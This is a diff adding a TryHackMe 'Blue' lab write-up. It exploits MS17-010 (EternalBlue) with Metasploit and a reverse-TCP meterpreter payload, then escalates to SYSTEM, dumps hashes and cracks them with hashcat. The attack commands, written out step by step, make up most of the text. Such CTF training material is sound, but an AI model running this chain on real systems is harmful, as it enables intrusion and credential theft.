@@ -1,0 +1,91 @@
+#+TITLE: TryHackMe - Blue writeup
+
+https://tryhackme.com/room/blue
+
+https://darkstar7471.com/resources.html
+
+* Reconnaissance
+
+#+begin_src shell
+	nmap -T4 -vv -p- 10.10.123.159
+	nmap -sV -vv -p 135,139,445,3389,49152,49153,49154,49158,49160 --script vuln 10.10.123.159
+#+end_src
+
+The target is vulnerable to *MS17-010* .
+
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+
+https://www.exploit-db.com/exploits/42315
+
+https://www.exploit-db.com/exploits/41891
+
+* Gain Access
+
+	#+begin_src shell
+		msfconsole
+
+		use exploit/windows/smb/ms17_010_eternalblue
+		set RHOSTS 10.10.123.159
+		set LHOST 10.10.10.10
+		set PAYLOAD windows/x64/meterpreter/reverse_tcp
+		exploit
+	#+end_src
+
+* Escalate privelege
+
+	Send gained shell to background (CTRL+Z), and let's convert the shell to a meterpreter shell:
+
+	#+begin_src shell
+		use post/multi/manager/shell_to_meterpreter
+		set SESSION 1
+		run
+	#+end_src
+
+	Escalate to 'NT AUTHORITY\SYSTEM', then migrate to a process running as 'NT AUTHORITY\SYSTEM':
+
+	#+begin_src shell
+		getsystem
+		ps
+		migrate <pid>
+	#+end_src
+
+* Cracking
+
+	In meterpreter shell, run `hashdump` to dump all the passwords on the machine.
+
+	On each row, the 4th field is the *NTLM* hash. `hashcat` mode for NTLM is 1000.
+
+	#+begin_src shell
+		hashcat <hash> --wordlist /usr/share/wordlists/rockyou.txt -m 1000
+	#+end_src
+
+* Flags
+
+	#+begin_src shell
+		C:\>dir flag* /s /p
+
+		Volume in drive C has no label.
+		Volume Serial Number is E611-0B66
+
+		Directory of C:\
+
+		03/17/2019  02:27 PM                24 flag1.txt
+		1 File(s)             24 bytes
+
+		Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent
+
+		03/17/2019  02:26 PM               482 flag1.lnk
+		03/17/2019  02:30 PM               848 flag2.lnk
+		03/17/2019  02:32 PM             2,344 flag3.lnk
+		3 File(s)          3,674 bytes
+
+		Directory of C:\Users\Jon\Documents
+
+		03/17/2019  02:26 PM                37 flag3.txt
+		1 File(s)             37 bytes
+
+		Directory of C:\Windows\System32\config
+
+		03/17/2019  02:32 PM                34 flag2.txt
+		1 File(s)             34 bytes
+	#+end_src
